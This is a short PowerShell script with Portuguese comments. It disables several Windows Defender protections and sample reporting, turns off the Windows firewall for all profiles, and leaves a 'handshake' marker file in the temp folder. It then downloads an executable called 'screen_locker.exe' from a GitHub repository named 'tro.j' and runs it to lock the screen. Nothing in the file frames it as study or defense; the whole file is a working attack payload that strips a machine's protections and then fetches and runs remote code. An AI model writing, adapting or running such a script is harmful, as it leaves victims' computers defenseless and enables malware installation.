# ---------- Desativações ----------
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
netsh advfirewall set allprofiles state off

# ---------- Handshake: cria marcador ----------
$handshakeFile = "$env:TEMP\handshake_restore.txt"
"restore_pending" | Out-File -FilePath $handshakeFile -Force

# ---------- Baixar e executar o screen locker ----------
$lockerUrl = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/screen_locker.exe"
$lockerPath = "$env:TEMP\screen_locker.exe"
(New-Object Net.WebClient).DownloadFile($lockerUrl, $lockerPath)
Start-Process $lockerPath   # executa e trava a tela (30s padrão, mas pode ser ajustado)
